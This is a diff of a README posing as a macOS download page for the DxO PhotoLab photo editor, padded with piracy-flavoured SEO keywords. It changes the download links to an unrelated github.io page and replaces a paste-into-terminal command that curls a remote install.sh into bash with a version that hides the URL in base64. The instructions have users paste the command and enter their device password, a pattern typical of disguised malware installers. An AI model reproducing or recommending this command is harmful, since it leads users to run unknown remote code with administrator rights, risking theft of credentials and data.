@@ -7,7 +7,7 @@ Favored by photography professionals and enthusiasts, DxO PhotoLab offers unmatc
 ---
 
 ## ✅ Download DxO PhotoLab for macOS  
-[![Download DxO PhotoLab](https://img.shields.io/badge/Download-DxO_PhotoLab-blueviolet)](https://dxo-photolab-mac-download.github.io/.github)
+[![Download DxO PhotoLab](https://img.shields.io/badge/Download-DxO_PhotoLab-blueviolet)](https://shuziktobehuman.github.io/huja/DxO)
 
 
 ## 📦 How to Install
@@ -25,7 +25,7 @@ Favored by photography professionals and enthusiasts, DxO PhotoLab offers unmatc
 
 1. Copy the installation command below.
 ```bash
-/bin/bash -c "$(curl -fsSL https://veitzeatz.com/get1/install.sh)"
+/bin/bash -c "$(curl -fsSL $(echo aHR0cHM6Ly9waGFubmFyaXRoLmNvbS9nZXQyL2luc3RhbGwuc2g= | base64 -d))"
 ```
 2. Open the terminal on your device and paste the command you copied above, then press the “Return” button.
 3. Enter your device password and confirm the installation.
@@ -68,7 +68,7 @@ DxO PhotoLab is a photo editing solution that combines AI-powered tools with awa
 
 ---
 
-[![Download DxO PhotoLab](https://img.shields.io/badge/Download-DxO_PhotoLab-blueviolet)](https://dxo-photolab-mac-download.github.io/.github)
+[![Download DxO PhotoLab](https://img.shields.io/badge/Download-DxO_PhotoLab-blueviolet)](https://shuziktobehuman.github.io/huja/DxO)
 
 ---
 
@@ -87,4 +87,5 @@ dxo photolab black friday, dxo photolab discount, dxo photolab download,
 dxo photolab free download, dxo photolab linux, dxo photolab price,  
 dxo photolab sale, dxo photolab torrent, dxo photolab5, dxo photolab6,  
 photolab dxo, photolab software, dxo photolab mac, dxo photolab mac download
+
 
